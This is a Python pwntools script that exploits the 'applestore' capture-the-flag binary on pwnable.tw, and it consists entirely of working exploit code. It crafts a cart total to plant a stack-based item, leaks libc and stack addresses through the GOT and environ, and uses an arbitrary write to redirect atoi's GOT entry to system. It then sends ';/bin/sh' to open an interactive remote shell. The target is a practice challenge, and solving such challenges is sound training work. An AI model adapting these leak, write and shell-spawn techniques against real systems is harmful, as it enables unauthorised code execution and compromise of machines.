#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("applestore")
libc = ELF("libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.terminal = ['alacritty', '-e', 'sh', '-c']
transitions = [199, 299, 499, 399]
dp = [-1] * 0x1c08

def search(curr):
    if dp[curr] != -1:
        return True

    for trans in transitions:
        if curr - trans == 0:
            dp[curr] = trans
            return True
        if curr - trans > 0:
            if search(curr - trans):
                dp[curr] = trans
                return True

    return False


def backtrack(val):
    link = []
    while val != 0:
        link.append(dp[val])
        val = val - dp[val]
    return link

def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("chall.pwnable.tw", 10104)

r = conn()

def add(idx):
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("> ")
    r.sendline(str(idx))


def www(what, where):
    r.recvuntil("> ")
    r.sendline("3")
    r.recvuntil("> ")
    payload = b""
    payload += b"27"
    payload += b"\x00" * 4
    payload += b"\x00" * 4
    payload += where
    payload += what
    r.sendline(payload)


def leak(payload):
    r.recvuntil("> ")
    r.sendline("4")
    r.recvuntil("> ")
    r.sendline(b"y " + payload)
    r.recvline()
    while r.recv(2) != b"27":
        r.recvline()
    r.recv(2)
    return r.recv(4)


def checkout():
    r.recvuntil("> ")
    r.sendline("5")
    r.recvuntil("> ")
    r.sendline("y")


def main():
    # script = "b *0x08048a6f\n"
    search(0x1c06)
    links = backtrack(0x1c06)
    for link in links:
        add(transitions.index(link) + 1)
    checkout()

    # puts leak
    payload = b""
    payload += p32(exe.got["puts"])
    payload += p32(exe.got["puts"])
    payload += p32(0)
    payload += p32(0)

    puts_leak = u32(leak(payload))
    log.info("Puts leaked at {}".format(hex(puts_leak)))
    libc.address = puts_leak - libc.symbols["puts"]

    # environ leak
    payload = b""
    payload += p32(libc.symbols["environ"])
    payload += p32(libc.symbols["environ"])
    payload += p32(0)
    payload += p32(0)

    stack_leak = u32(leak(payload))
    log.info("Stack leak at {}".format(hex(stack_leak)))
    ebp_addr = stack_leak - 264

    # sleep(1)
    # gdb.attach(r, gdbscript=script)

    # overwrite atoi with system addr
    where = p32(ebp_addr - 12)
    what = p32(exe.got["atoi"] + 0x22)
    log.info("Writing {} at {}".format(hex(exe.got["atoi"] + 12), hex(ebp_addr)))
    www(what, where)
    r.recvuntil("> ")
    
    # pwn
    payload = p32(libc.symbols["system"])
    payload += b";/bin/sh"
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()

